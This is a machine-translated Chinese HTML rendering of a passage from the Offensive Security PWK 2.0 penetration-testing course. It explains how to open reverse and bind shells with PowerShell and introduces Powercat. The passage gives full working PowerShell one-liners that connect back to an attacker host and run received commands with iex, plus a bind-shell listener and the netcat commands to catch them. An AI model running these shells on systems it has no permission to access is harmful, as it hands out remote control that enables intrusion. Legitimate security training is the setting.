<div style="position:absolute;top:104210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)</font></font></nobr></div>
<div style="position:absolute;top:104227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></nobr></div>
<div style="position:absolute;top:104245;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);</font></font></nobr></div>
<div style="position:absolute;top:104261;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sendback = (iex $data 2&gt;&amp;1 | Out-String );</font></font></nobr></div>
<div style="position:absolute;top:104278;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sendback2 = $sendback + 'PS' + (pwd).Path + '&gt; ';</font></font></nobr></div>
<div style="position:absolute;top:104295;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);</font></font></nobr></div>
<div style="position:absolute;top:104312;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$stream.Write($sendbyte,0,$sendbyte.Length);</font></font></nobr></div>
<div style="position:absolute;top:104329;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$stream.Flush();</font></font></nobr></div>
<div style="position:absolute;top:104346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></nobr></div>
<div style="position:absolute;top:104363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$client.Close();</font></font></nobr></div>
<div style="position:absolute;top:104382;left:353"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 104 - PowerShell 反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与我们以前使用的工具相比，这可能看起来非常复杂。</font><font style="vertical-align: inherit;">然而，</font></font></nobr></div>
<div style="position:absolute;top:104431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 功能强大且灵活；</font><font style="vertical-align: inherit;">它不是一个单一功能的工具。</font><font style="vertical-align: inherit;">因此，我们必须使用一个</font></font></nobr></div>
<div style="position:absolute;top:104451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用复杂功能的复杂语法。</font></font></nobr></div>
<div style="position:absolute;top:104483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码由几个用分号分隔的命令组成。</font><font style="vertical-align: inherit;">首先，我们看到一个</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量，</font></font></nobr></div>
<div style="position:absolute;top:104503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它被分配了目标 IP 地址、一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量、一个称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bytes</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的字节数组</font><font style="vertical-align: inherit;">和一段时间</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:104571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">91 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/dotnet/api/system.net?view=netframework-4.7.2</font></font></font></nobr></div>
<div style="position:absolute;top:104591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">92 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nikhil SamratAshok Mittal，2015 年），http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:104719;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="89"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 89 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:104752;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:105829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:105829;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:105829;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">89</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104848;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">循环后跟关闭客户端连接的调用。</font><font style="vertical-align: inherit;">在while循环中，我们可以看到几行</font></font></nobr></div>
<div style="position:absolute;top:104867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">负责向网络流读取和写入数据。</font><font style="vertical-align: inherit;">请注意，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iex </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">93</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (“ </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Invoke-</font></font></i></nobr></div>
<div style="position:absolute;top:104886;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表达式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">”) cmdlet 是此代码块的关键部分，因为它运行作为命令接收的任何字符串</font></font></nobr></div>
<div style="position:absolute;top:104906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后命令的结果被重定向并通过数据流发回。</font></font></nobr></div>
<div style="position:absolute;top:104939;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以将此代码卷成一段公认的冗长单行代码，以在命令提示符下执行：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:104990;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =</font></font></b></nobr></div>
<div style="position:absolute;top:105007;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T</font></font></b></nobr></div>
<div style="position:absolute;top:105024;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );</font></font></b></nobr></div>
<div style="position:absolute;top:105041;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$sendback2 = $sendback + 'PS' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII</font></font></b></nobr></div>
<div style="position:absolute;top:105058;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c</font></font></b></nobr></div>
<div style="position:absolute;top:105075;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lient.Close()"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105095;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 105 - 使用 PowerShell 发送反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这条单线乍一看可能很费劲，但没必要记住它；</font><font style="vertical-align: inherit;">我们会</font></font></nobr></div>
<div style="position:absolute;top:105143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能会在直播期间复制并粘贴此类命令（替换 IP 和端口号）</font></font></nobr></div>
<div style="position:absolute;top:105163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">渗透测试。</font></font></nobr></div>
<div style="position:absolute;top:105196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，我们使用 Netcat 接收到反向 shell：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lnvp 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:105247;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 443 ...</font></font></nobr></div>
<div style="position:absolute;top:105264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从（未知）[10.11.0.22] 63515 连接到 [10.11.0.4]</font></font></nobr></div>
<div style="position:absolute;top:105298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:105318;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 106 - 使用 nc 接收反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">简而言之，通过简单地替换</font><i><font style="vertical-align: inherit;">System.Net.Sockets.TCPClient 中</font></i><font style="vertical-align: inherit;">的 IP 地址和端口号</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:105367;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用，我们可以轻松地重用这个 PowerShell 反向 shell 命令。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105401;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.3 PowerShell 绑定 Shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:105439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在处理绑定 shell 时，该过程是相反的。</font><font style="vertical-align: inherit;">我们首先通过创建绑定外壳</font></font></nobr></div>
<div style="position:absolute;top:105458;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Bob 的计算机上运行 PowerShell，然后使用 Netcat 从 Alice 的计算机连接到它。</font></font></nobr></div>
<div style="position:absolute;top:105491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的代码片段中，我们将再次</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">-c</font></font></b><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">将命令传递给</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:105510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与反向 shell 一样，这个复杂的命令可以分解为几个命令。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:105530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">client</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">stream</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">byte</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量之外，我们还有一个新的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">侦听器</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量，它使用</font></font></nobr></div>
<div style="position:absolute;top:105549;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net.Sockets.TcpListener </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">94</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类。</font><font style="vertical-align: inherit;">这个类需要两个参数：首先是地址</font></font></nobr></div>
<div style="position:absolute;top:105569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听，然后是端口。</font><font style="vertical-align: inherit;">通过提供 0.0.0.0 作为本地地址，我们的绑定 shell 将是</font></font></nobr></div>
<div style="position:absolute;top:105588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于系统上的所有 IP 地址。</font><font style="vertical-align: inherit;">同样，我们使用 iex cmdlet 来执行我们的命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:105623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:105640;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie</font></font></b></nobr></div>
<div style="position:absolute;top:105656;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt</font></font></b></nobr></div>
<div style="position:absolute;top:105673;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString</font></font></b></nobr></div>
<div style="position:absolute;top:105691;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'P</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:105745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">93 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:105760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表达式？view=powershell-6</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:105779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">94 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcplistener?view=netframework-4.7.2</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:105907;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="90"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 90 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:105940;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:107017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:107017;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:107017;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">90</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106036;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str</font></font></b></nobr></div>
<div style="position:absolute;top:106052;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto</font></font></b></nobr></div>
<div style="position:absolute;top:106069;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p()"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106089;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 107 - 使用 PowerShell 设置绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用绑定外壳监听，我们可以像我们一样使用爱丽丝机器上的 Netcat 连接到它</font></font></nobr></div>
<div style="position:absolute;top:106138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与任何其他外壳。</font><font style="vertical-align: inherit;">我们</font><font style="vertical-align: inherit;">为 Netcat</font><font style="vertical-align: inherit;">包含了</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-v</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项，因为我们的绑定 shell 可能并不总是存在</font></font></nobr></div>
<div style="position:absolute;top:106157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在第一次连接时使用命令提示符：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:106209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 443 (https) 打开</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106226;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置文件</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:106243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows IP 配置</font></font></nobr></div>
<div style="position:absolute;top:106260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以太网适配器本地连接：</font></font></nobr></div>
<div style="position:absolute;top:106277;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定于连接的 DNS 后缀。</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
<div style="position:absolute;top:106294;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:106311;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.255.0</font></font></nobr></div>
<div style="position:absolute;top:106327;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.1</font></font></nobr></div>
<div style="position:absolute;top:106362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt;</font></font></nobr></div>
<div style="position:absolute;top:106381;left:249"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 108 - 使用 nc 连接到使用 PowerShell 创建的绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell 非常强大，我们甚至还没有触及它的表面</font></font></nobr></div>
<div style="position:absolute;top:106430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它的功能。</font><font style="vertical-align: inherit;">由于微软越来越多地使用基于 Windows 的 PowerShell</font></font></nobr></div>
<div style="position:absolute;top:106449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理和自动化，知道如何正确使用 PowerShell 来实现我们的目标是</font></font></nobr></div>
<div style="position:absolute;top:106468;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">极其重要。</font><font style="vertical-align: inherit;">请参阅 Microsoft PowerShell 文档</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">95</font></font></font></nobr></div>
<div style="position:absolute;top:106468;left:702"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和微软</font></font></nobr></div>
<div style="position:absolute;top:106488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">System.Net 参考更多类和方法以及各种 PowerShell 培训和</font></font></nobr></div>
<div style="position:absolute;top:106507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可在线讨论。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106542;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.3.4 动力猫</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106579;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">96</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本质上是 besimorhino 编写的 Netcat 的 PowerShell 版本。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">97</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是我们的剧本</font></font></nobr></div>
<div style="position:absolute;top:106599;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以下载到 Windows 主机以利用 PowerShell 的优势并简化</font></font></nobr></div>
<div style="position:absolute;top:106618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建绑定/反向外壳。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:106680;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Powercat 可以通过</font></font></i><b><font color="#000000" style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt install powercat</font></font></font></b><font style="vertical-align: inherit;"><i><font style="vertical-align: inherit;">安装在 Kali 中</font></i></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它将放置</font></font></i></nobr></div>
<div style="position:absolute;top:106700;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">剧本中</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的/ usr /共享/ Windows的资源/的PowerCat</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:106762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以跳过第一步，将脚本从我们的 Kali Linux 机器传输到 Windows</font></font></nobr></div>
<div style="position:absolute;top:106781;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机，因为我们已经熟悉文件传输。</font></font></nobr></div>
<div style="position:absolute;top:106814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用目标主机上的脚本，我们首先使用称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dot-sourcing </font></font></i><font style="vertical-align: inherit;"><font style="font-size:8px"><font style="vertical-align: inherit;">98</font></font><font style="vertical-align: inherit;">的 PowerShell 功能</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"></font></font></nobr></div>
<div style="position:absolute;top:106833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载 powercat.ps1 脚本。</font><font style="vertical-align: inherit;">这将使脚本中声明的所有变量和函数</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:106907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">95 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2019 年），https://docs.microsoft.com/en-us/powershell/</font></font></font></nobr></div>
<div style="position:absolute;top:106927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">96 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（besimorhino/powercat，2017），https://github.com/besimorhino/powercat/blob/master/powercat.ps1</font></font></font></nobr></div>
<div style="position:absolute;top:106947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">97 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(besimorhino, 2018), https://github.com/besimorhino</font></font></font></nobr></div>
<div style="position:absolute;top:106967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">98 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(SS64, 2019), https://ss64.com/ps/source.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:107095;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="91"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 91 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:107128;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:108205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:108205;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
